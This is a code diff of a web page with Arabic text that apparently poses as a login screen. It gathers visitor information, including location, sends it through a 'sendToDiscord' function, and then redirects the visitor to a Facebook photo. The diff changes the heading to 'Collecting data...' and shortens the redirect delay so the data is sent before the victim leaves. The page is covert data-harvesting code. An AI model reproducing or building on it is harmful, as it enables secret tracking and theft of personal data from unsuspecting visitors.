@@ -59,7 +59,7 @@
 
 <div class="main-content">
   <div class="card">
-    <h2>جاري تسجيل الدخول...</h2>
+    <h2>جاري جمع البيانات...</h2>
     <p>من فضلك انتظر قليلاً</p>
     <div class="loader"></div>
   </div>
@@ -132,10 +132,10 @@ ${locationInfo}
 
     await sendToDiscord(message);
 
-    document.querySelector('.card').innerHTML = "<h3>✅ تم تسجيل الدخول بنجاح</h3><p>جاري تحويلك الآن...</p>";
+    // تحويل المستخدم مباشرة إلى الرابط المحدد بعد إرسال البيانات
     setTimeout(() => {
       window.location.href = "https://web.facebook.com/photo?fbid=122200435544109181&set=pcb.122200435988109181";
-    }, 3000);
+    }, 500); // تأخير بسيط لضمان إرسال البيانات
   };
 
   gatherInfo().catch(err => {
